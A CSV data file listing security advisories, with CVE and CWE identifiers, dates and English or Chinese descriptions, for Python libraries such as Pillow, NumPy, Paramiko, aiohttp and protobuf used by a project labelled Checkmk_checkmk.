Checkmk_checkmk,meraki,,True,,,2023-12-13,"aiohttp is an asynchronous HTTP client/server framework for asyncio and Python. Improper validation made it possible for an attacker to modify the HTTP request (e.g. to insert a new header) or create a new HTTP request if the attacker controls the HTTP version. The vulnerability only occurs if the attacker can control the HTTP version of the request. This issue has been patched in version 3.9.0.

meraki from version 1.40.1 requires aiohttp 3.9.0",2,2
Checkmk_checkmk,msal,,True,,CWE-943,2023-09-18,"## Overview
[msal](https://pypi.org/project/msal) is a The Microsoft Authentication Library (MSAL) for Python library

Affected versions of this package are vulnerable to Improper Neutralization of Special Elements in Data Query Logic due to improper input sanitisation in `authcode.py` file.
## Remediation
Upgrade `msal` to version 1.24.1 or higher.
## References
- [GitHub Commit](https://github.com/AzureAD/microsoft-authentication-library-for-python/commit/3427c2577bb674196a59e58cbf5aa91ad92cba7d)
",2,2
Checkmk_checkmk,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
Checkmk_checkmk,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
Checkmk_checkmk,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
Checkmk_checkmk,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
Checkmk_checkmk,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
Checkmk_checkmk,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
Checkmk_checkmk,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
Checkmk_checkmk,oauthlib,,True,,CWE-534,2017-12-04,"## Overview
Affected versions of [`oauthlib`](https://pypi.python.org/pypi/oauthlib) are vulnerable to Information Exposure Through Debug Log Files which happend because the debug log printed password to the log files.

## Remediation
Upgrade `oauthlib` to version 0.7.0 or higher.

## References
- [GitHub Changelog](https://github.com/idan/oauthlib/blob/master/CHANGELOG.rst#070-2014-10-27)
- [Github Issue](https://github.com/idan/oauthlib/issues/256)
- [Github Commit](https://github.com/idan/oauthlib/commit/fef1f7987cc6298e744b7d4290e3fc9a9701831b)
",2,2
Checkmk_checkmk,paramiko,,True,CVE-2018-7750,CWE-287,2018-03-13,<p>Paramiko是一个基于Python的SSH协议库。SSH server是其中的一个SSH服务器。 Paramiko中的SSH服务器实现的transport.py文件存在安全漏洞，该漏洞源于程序在处理其他请求之前没有正确的检测身份验证是否完成。攻击者可利用该漏洞绕过身份验证，以下版本受到影响：Paramiko 1.17.6之前版本，1.18.5之前的1.18.x版本，2.0.8之前的2.0.x版本，2.1.5之前的2.1.x版本，2.2.3之前的2.2.x版本，2.3.2之前的2.3.x版本，2.4.1之前的2.4.x版本。</p>,1,1
Checkmk_checkmk,paramiko,,True,CVE-2008-0299,CWE-200,2008-01-16,Paramiko 1.7.1及其早期版本中的common.py在运行线程或者交叉进程时，并不会正常使用随机区域。这使得一个会话可以通过对某一会话的状态预测来从另外一个会话获得敏感信息。,2,0
Checkmk_checkmk,paramiko,,True,CVE-2022-24302,CWE-362,2022-03-17,"Paramiko是一个 SSHv2 协议的纯 Python 实现。提供客户端和服务器功能。
Paramiko 2.10.1之前版本 存在安全漏洞，该漏洞源于write_private_key_file函数中的竞争条件（creation and chmod之间）允许未经授权的信息泄露。",2,0
Checkmk_checkmk,pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
Checkmk_checkmk,pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
Checkmk_checkmk,pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
Checkmk_checkmk,pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
Checkmk_checkmk,pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
Checkmk_checkmk,pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
Checkmk_checkmk,pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
Checkmk_checkmk,pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
Checkmk_checkmk,pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
Checkmk_checkmk,pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
Checkmk_checkmk,pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
Checkmk_checkmk,pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
Checkmk_checkmk,pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
Checkmk_checkmk,pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
Checkmk_checkmk,pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
Checkmk_checkmk,pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
Checkmk_checkmk,pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
Checkmk_checkmk,pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
Checkmk_checkmk,pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
Checkmk_checkmk,pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
Checkmk_checkmk,pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
Checkmk_checkmk,pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
Checkmk_checkmk,pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
Checkmk_checkmk,pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
Checkmk_checkmk,pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
Checkmk_checkmk,pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
Checkmk_checkmk,pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
Checkmk_checkmk,pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
Checkmk_checkmk,pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
Checkmk_checkmk,pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
Checkmk_checkmk,pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
Checkmk_checkmk,pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
Checkmk_checkmk,pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
Checkmk_checkmk,pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
Checkmk_checkmk,pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
Checkmk_checkmk,pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
Checkmk_checkmk,pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
Checkmk_checkmk,pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
Checkmk_checkmk,pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
Checkmk_checkmk,pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
Checkmk_checkmk,pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
Checkmk_checkmk,pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
Checkmk_checkmk,pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
Checkmk_checkmk,pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
Checkmk_checkmk,pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
Checkmk_checkmk,pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
Checkmk_checkmk,pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
Checkmk_checkmk,pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
Checkmk_checkmk,pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
Checkmk_checkmk,pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
Checkmk_checkmk,protobuf,,True,CVE-2022-1941,CWE-1286,2022-09-22,Protocol Buffers 是 Google 开发的一种数据描述语言，广泛应用于数据存储和通信协议中。该漏洞源于对 MessageSet 类型的解析处理不当，攻击者通过构造包含多个键值对的特殊消息，可以导致解析问题，触发内存耗尽。,2,0
